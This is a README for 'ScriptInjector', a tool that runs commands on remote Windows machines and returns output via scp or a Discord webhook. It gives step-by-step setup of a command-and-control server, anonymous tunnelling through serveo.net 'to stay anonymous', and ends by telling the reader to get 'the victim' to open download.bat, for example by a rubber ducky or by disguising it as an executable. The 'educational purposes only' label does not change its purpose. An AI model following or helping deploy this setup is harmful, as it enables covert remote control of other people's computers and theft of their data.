# ScriptInjector
Inject and run scripts on remote computers and get the output back via scp or a discord webhook
For educational purposes only.

## How it works
1. Clone this repo and cd into it
    ```
    sudo apt install git -y
    git clone https://github.com/emaa10/ScriptInjector.git
    cd ScriptInjector
    git checkout New-Webhook
    ```

2. Install packages
    ```
    sudo apt install -y apache2 screen
    ```

3. Setup an apache2 webserver and put the files under `/src` into `/var/www/html/`
    ```
    sudo mv src /var/www/html
    ```

4. Generate an ssh-key to allow serveo to connect. We will use serveo for port forwarding, you can use other services if you want, too. 
    ```
    ssh-keygen -t rsa
    ```
    Press enter on all questions.
    
5. Setup serveo.net to stay anonymous
    forward port 80 (http) in a new screen session. You might be asked to verify using google.
    ```
    screen -S http ssh -R your_hostname:80:localhost:80 serveo.net
    ```

6. Adapt Setup.bat and scheduled.bat to match your chosen hostname / your public IP

7. Create a discord webhook in a channel on a server and paste the URL into Setup.bat and scheduled.bat.

8. Start serveo (or a different port forwarding service)
    - See the launch_serveo.txt file for 2 commands to forward ssh and http to your_hostname.serveo.net
    - You can use screen to start multiple serveo forwarding simultaneously

9. Create folders and the input.txt
    ```
    touch /var/www/html/input.txt
    echo "dir C:\Users" >> /var/www/html/input.txt
    sudo mkdir /mnt/income
    sudo chown www-data /mnt/income
    sudo chgrp www-data /mnt/income
    sudo chmod 777 /mnt/income
    ```

10. Get the victim to open the download.bat
    - That's your part. There are many options: Using a rubberducky script or converting the bat file into an executable.